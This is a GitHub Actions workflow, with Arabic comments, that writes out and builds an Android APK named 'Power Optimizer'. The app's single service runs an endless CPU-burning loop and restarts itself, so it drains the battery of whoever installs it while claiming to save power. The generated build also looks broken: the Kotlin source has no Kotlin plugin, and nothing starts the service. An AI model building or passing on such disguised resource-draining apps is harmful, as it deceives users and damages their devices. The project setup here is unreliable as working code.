name: Final Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up JDK 11
        uses: actions/setup-java@v3
        with:
          java-version: '11'
          distribution: 'temurin'
      
      - name: Create Project Files
        run: |
          # 1. إنشاء ملف الإعدادات
          echo "include ':app'" > settings.gradle
          
          # 2. إنشاء ملف build.gradle الرئيسي
          echo "buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:7.4.2' } }
          allprojects { repositories { google(); mavenCentral() } }" > build.gradle
          
          # 3. إنشاء مجلدات التطبيق
          mkdir -p app/src/main/java/com/system
          
          # 4. إنشاء build.gradle للتطبيق
          echo "plugins { id 'com.android.application' }; android { namespace 'com.system'; compileSdk 33; defaultConfig { applicationId 'com.system.power'; minSdk 21; targetSdk 33; versionCode 1; versionName '1.0' } }" > app/build.gradle
          
          # 5. إنشاء المانيفست
          echo '<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.system"><uses-permission android:name="android.permission.FOREGROUND_SERVICE" /><application android:label="Power Optimizer"><service android:name=".ResourceService" android:enabled="true" android:exported="false" /></application></manifest>' > app/src/main/AndroidManifest.xml
          
          # 6. إنشاء كود الخدمة
          echo 'package com.system; import android.app.Service; import android.content.Intent; import android.os.IBinder; class ResourceService : Service() { override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int { Thread { while (true) { Math.sqrt(Math.random()) } }.start(); return START_STICKY }; override fun onBind(intent: Intent?): IBinder? = null }' > app/src/main/java/com/system/ResourceService.kt

      - name: Build with Gradle
        run: gradle assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v3
        with:
          name: Final-APK
          path: app/build/outputs/apk/debug/*.apk
